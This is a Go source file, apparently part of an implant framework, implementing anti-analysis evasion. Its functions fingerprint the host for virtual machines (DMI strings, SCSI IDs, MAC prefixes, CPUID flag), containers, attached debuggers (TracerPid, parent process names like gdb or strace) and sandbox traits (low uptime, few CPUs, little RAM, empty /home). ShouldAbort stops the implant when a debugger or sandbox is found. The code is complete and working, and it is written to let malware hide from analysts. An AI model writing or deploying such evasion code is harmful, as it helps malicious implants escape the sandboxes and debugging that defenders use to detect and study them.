package evasion

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/Real-Fruit-Snacks/Aquifer/pkg/config"
)

// EnvironmentInfo holds the results of environment fingerprinting.
type EnvironmentInfo struct {
	IsVM        bool   `json:"is_vm"`
	IsContainer bool   `json:"is_container"`
	IsDebugger  bool   `json:"is_debugger"`
	IsSandbox   bool   `json:"is_sandbox"`
	Hypervisor  string `json:"hypervisor,omitempty"`
}

// RunFingerprint performs comprehensive environment fingerprinting to detect
// virtual machines, containers, debuggers, and sandboxes. Results are returned
// as a structured EnvironmentInfo for the caller to act on.
func RunFingerprint() *EnvironmentInfo {
	info := &EnvironmentInfo{}

	// VM detection via multiple vectors.
	info.Hypervisor = detectHypervisor()
	info.IsVM = info.Hypervisor != ""

	// Container detection.
	info.IsContainer = detectContainer()

	// Debugger detection.
	info.IsDebugger = detectDebugger()

	// Sandbox heuristics.
	info.IsSandbox = detectSandbox()

	return info
}

// ShouldAbort evaluates whether the implant should terminate based on the
// environment fingerprint and the implant configuration. Returns true if
// evasion checks indicate an unsafe execution environment.
func ShouldAbort(info *EnvironmentInfo, cfg *config.ImplantConfig) bool {
	if !cfg.SandboxEvasion {
		return false
	}

	// Abort if running inside a debugger -- always unsafe.
	if info.IsDebugger {
		return true
	}

	// Abort if sandbox detected -- likely automated analysis.
	// VM detection is informational; many targets run in VMs legitimately.
	if info.IsSandbox {
		return true
	}

	return false
}

// detectHypervisor checks multiple sources for hypervisor presence.
// Returns the hypervisor name if detected, empty string otherwise.
func detectHypervisor() string {
	// Check DMI data for known hypervisor strings.
	if hyp := checkDMI(); hyp != "" {
		return hyp
	}

	// Check /proc/scsi/scsi for virtual disk identifiers.
	if hyp := checkSCSI(); hyp != "" {
		return hyp
	}

	// Check network interface MAC address OUIs for known hypervisor prefixes.
	if hyp := checkMACAddresses(); hyp != "" {
		return hyp
	}

	// Check /proc/cpuinfo for hypervisor flag.
	if hyp := checkCPUInfo(); hyp != "" {
		return hyp
	}

	return ""
}

// checkDMI reads DMI/SMBIOS data from sysfs to identify known hypervisors.
func checkDMI() string {
	dmiPaths := []struct {
		path string
		name string
	}{
		{"/sys/class/dmi/id/product_name", ""},
		{"/sys/class/dmi/id/sys_vendor", ""},
		{"/sys/class/dmi/id/board_vendor", ""},
		{"/sys/class/dmi/id/bios_vendor", ""},
		{"/sys/class/dmi/id/chassis_vendor", ""},
	}

	hypervisors := map[string]string{
		"vmware":       "VMware",
		"virtualbox":   "VirtualBox",
		"vbox":         "VirtualBox",
		"kvm":          "KVM",
		"qemu":         "QEMU",
		"xen":          "Xen",
		"hyper-v":      "Hyper-V",
		"microsoft":    "Hyper-V",
		"parallels":    "Parallels",
		"bhyve":        "bhyve",
		"innotek gmbh": "VirtualBox",
	}

	for _, dp := range dmiPaths {
		data, err := os.ReadFile(dp.path)
		if err != nil {
			continue
		}
		content := strings.ToLower(strings.TrimSpace(string(data)))
		for keyword, name := range hypervisors {
			if strings.Contains(content, keyword) {
				return name
			}
		}
	}

	return ""
}

// checkSCSI reads /proc/scsi/scsi for virtual disk controller identifiers.
func checkSCSI() string {
	data, err := os.ReadFile("/proc/scsi/scsi")
	if err != nil {
		return ""
	}

	content := strings.ToLower(string(data))
	scsiSignatures := map[string]string{
		"vmware": "VMware",
		"vbox":   "VirtualBox",
		"virtio": "KVM",
		"qemu":   "QEMU",
		"xen":    "Xen",
		"msft":   "Hyper-V",
	}

	for keyword, name := range scsiSignatures {
		if strings.Contains(content, keyword) {
			return name
		}
	}

	return ""
}

// checkMACAddresses inspects network interface MAC OUIs for known hypervisor prefixes.
func checkMACAddresses() string {
	// Known hypervisor MAC OUI prefixes (first 3 bytes).
	knownOUIs := map[string]string{
		"00:0c:29": "VMware",
		"00:50:56": "VMware",
		"00:05:69": "VMware",
		"08:00:27": "VirtualBox",
		"52:54:00": "QEMU",
		"00:1c:42": "Parallels",
		"00:16:3e": "Xen",
		"00:15:5d": "Hyper-V",
	}

	ifaces, err := net.Interfaces()
	if err != nil {
		return ""
	}

	for _, iface := range ifaces {
		mac := iface.HardwareAddr.String()
		if len(mac) < 8 {
			continue
		}
		prefix := strings.ToLower(mac[:8])
		if name, ok := knownOUIs[prefix]; ok {
			return name
		}
	}

	return ""
}

// checkCPUInfo parses /proc/cpuinfo for the hypervisor flag, which is set
// by the CPU when running under a hypervisor (via CPUID).
func checkCPUInfo() string {
	f, err := os.Open("/proc/cpuinfo")
	if err != nil {
		return ""
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.ToLower(scanner.Text())
		if strings.HasPrefix(line, "flags") && strings.Contains(line, "hypervisor") {
			// The hypervisor CPUID flag is present but doesn't identify which one.
			// Return a generic indicator; DMI/MAC checks provide the specific name.
			return "Unknown (CPUID hypervisor flag)"
		}
	}

	return ""
}

// detectContainer checks for container runtime indicators.
func detectContainer() bool {
	// Check for Docker's sentinel file.
	if _, err := os.Stat("/.dockerenv"); err == nil {
		return true
	}

	// Check for Podman/CRI-O container environment file.
	if _, err := os.Stat("/run/.containerenv"); err == nil {
		return true
	}

	// Check cgroup paths for container runtime strings.
	if checkCgroupContainer() {
		return true
	}

	// Check PID 1 cmdline -- in containers it's typically the entrypoint,
	// not a real init system.
	if checkPID1Cmdline() {
		return true
	}

	return false
}

// checkCgroupContainer reads the current process's cgroup assignments and
// looks for strings indicating container runtimes.
func checkCgroupContainer() bool {
	data, err := os.ReadFile("/proc/self/cgroup")
	if err != nil {
		return false
	}

	content := strings.ToLower(string(data))
	indicators := []string{
		"docker",
		"lxc",
		"containerd",
		"kubepods",
		"crio",
		"podman",
	}

	for _, ind := range indicators {
		if strings.Contains(content, ind) {
			return true
		}
	}

	return false
}

// checkPID1Cmdline examines the PID 1 command line. On bare metal or VM,
// PID 1 is typically systemd, init, or similar. In containers it may be
// an application binary or shell.
func checkPID1Cmdline() bool {
	data, err := os.ReadFile("/proc/1/cmdline")
	if err != nil {
		return false
	}

	// cmdline uses null bytes as separators.
	cmdline := strings.ToLower(strings.ReplaceAll(string(data), "\x00", " "))

	// Known init systems on real hosts.
	initSystems := []string{
		"systemd",
		"/sbin/init",
		"/lib/systemd",
		"upstart",
		"openrc",
	}

	for _, init := range initSystems {
		if strings.Contains(cmdline, init) {
			return false // Looks like a real host.
		}
	}

	// If PID 1 is not a known init system, likely a container.
	return len(cmdline) > 0
}

// detectDebugger checks if the current process is being traced by a debugger.
func detectDebugger() bool {
	// Check TracerPid in /proc/self/status.
	if checkTracerPid() {
		return true
	}

	// Check if parent process is a known debugger.
	if checkParentDebugger() {
		return true
	}

	return false
}

// checkTracerPid reads /proc/self/status for TracerPid field.
// A non-zero value indicates an active ptrace attachment.
func checkTracerPid() bool {
	f, err := os.Open("/proc/self/status")
	if err != nil {
		return false
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.HasPrefix(line, "TracerPid:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				pid, err := strconv.Atoi(fields[1])
				if err == nil && pid != 0 {
					return true
				}
			}
			break
		}
	}

	return false
}

// checkParentDebugger reads the parent process name and checks if it's
// a known debugging or tracing tool.
func checkParentDebugger() bool {
	ppid := os.Getppid()
	commPath := fmt.Sprintf("/proc/%d/comm", ppid)

	data, err := os.ReadFile(commPath)
	if err != nil {
		return false
	}

	comm := strings.TrimSpace(strings.ToLower(string(data)))
	debuggers := []string{
		"gdb",
		"lldb",
		"strace",
		"ltrace",
		"radare2",
		"r2",
		"ida",
		"edb",
		"valgrind",
		"perf",
	}

	for _, dbg := range debuggers {
		if comm == dbg {
			return true
		}
	}

	return false
}

// detectSandbox applies heuristics to detect automated analysis sandboxes.
// Sandboxes typically have low uptime, minimal hardware, and no user activity.
func detectSandbox() bool {
	indicators := 0

	// Check uptime: sandboxes often have very short uptimes.
	if checkLowUptime(5 * time.Minute) {
		indicators++
	}

	// Check CPU count: sandboxes often allocate minimal CPUs.
	if runtime.NumCPU() <= 1 {
		indicators++
	}

	// Check total RAM: sandboxes often have limited memory.
	if checkLowRAM(2 * 1024 * 1024 * 1024) { // < 2 GB
		indicators++
	}

	// Check for real user activity: empty /home suggests no real users.
	if checkEmptyHome() {
		indicators++
	}

	// Require at least 2 indicators to flag as sandbox to reduce false positives.
	return indicators >= 2
}

// checkLowUptime reads /proc/uptime and returns true if system uptime is
// below the given threshold.
func checkLowUptime(threshold time.Duration) bool {
	data, err := os.ReadFile("/proc/uptime")
	if err != nil {
		return false
	}

	fields := strings.Fields(string(data))
	if len(fields) < 1 {
		return false
	}

	uptimeSec, err := strconv.ParseFloat(fields[0], 64)
	if err != nil {
		return false
	}

	return time.Duration(uptimeSec*float64(time.Second)) < threshold
}

// checkLowRAM reads /proc/meminfo for MemTotal and returns true if total
// physical memory is below the given threshold in bytes.
func checkLowRAM(thresholdBytes uint64) bool {
	f, err := os.Open("/proc/meminfo")
	if err != nil {
		return false
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.HasPrefix(line, "MemTotal:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				// MemTotal is reported in kB.
				kbVal, err := strconv.ParseUint(fields[1], 10, 64)
				if err == nil {
					return kbVal*1024 < thresholdBytes
				}
			}
			break
		}
	}

	return false
}

// checkEmptyHome checks if /home has any user directories, which would
// indicate real user activity on the system.
func checkEmptyHome() bool {
	entries, err := os.ReadDir("/home")
	if err != nil {
		return true // Can't read /home, suspicious.
	}

	// Filter out hidden entries.
	realEntries := 0
	for _, e := range entries {
		if !strings.HasPrefix(e.Name(), ".") && e.IsDir() {
			realEntries++
		}
	}

	return realEntries == 0
}
